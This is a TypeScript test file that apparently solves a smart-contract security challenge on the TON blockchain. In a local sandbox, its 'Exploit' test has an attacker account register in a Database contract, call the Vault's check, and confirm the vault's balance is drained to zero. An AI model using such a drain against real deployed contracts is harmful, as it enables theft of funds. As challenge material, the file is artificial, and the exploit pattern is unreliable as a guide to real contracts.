import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, Cell, Dictionary, toNano } from '@ton/core';
import { Database, value } from '../wrappers/wrappers/Database';
import { Vault } from '../wrappers/wrappers/Vault';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

// npx blueprint test Vault.spec.ts
describe('Vault', () => {
    let vault_code: Cell;
    let database_code: Cell;

    beforeAll(async () => {
        vault_code = await compile('Vault');
        database_code = await compile('Database');
    });

    let blockchain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let vault: SandboxContract<Vault>;
    let database: SandboxContract<Database>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('100');
        blockchain = await Blockchain.create();

        owner = await blockchain.treasury('owner');
        exploiter = await blockchain.treasury('exploiter');

        const emptyDict = Dictionary.empty<bigint, bigint>(Dictionary.Keys.BigUint(256), value);

        database = blockchain.openContract(
            Database.createFromConfig({ admin_address: owner.address, db: emptyDict }, database_code),
        );
        vault = blockchain.openContract(Vault.createFromConfig({ database_address: database.address }, vault_code));

        const deployVaultResult = await vault.sendDeploy(owner.getSender(), initBalance);

        expect(deployVaultResult.transactions).toHaveTransaction({
            from: owner.address,
            to: vault.address,
            deploy: true,
            success: true,
        });

        const deployDatabaseResult = await database.sendSetVault(owner.getSender(), initBalance, vault.address);

        expect(deployDatabaseResult.transactions).toHaveTransaction({
            from: owner.address,
            to: database.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit', async () => {
        await database.sendRegister(exploiter.getSender(), toNano('0.1'), exploiter.address);

        await vault.sendCheck(exploiter.getSender(), toNano('0.1'));

        expect((await blockchain.getContract(vault.address)).balance == 0n).toBe(true);
    });
});
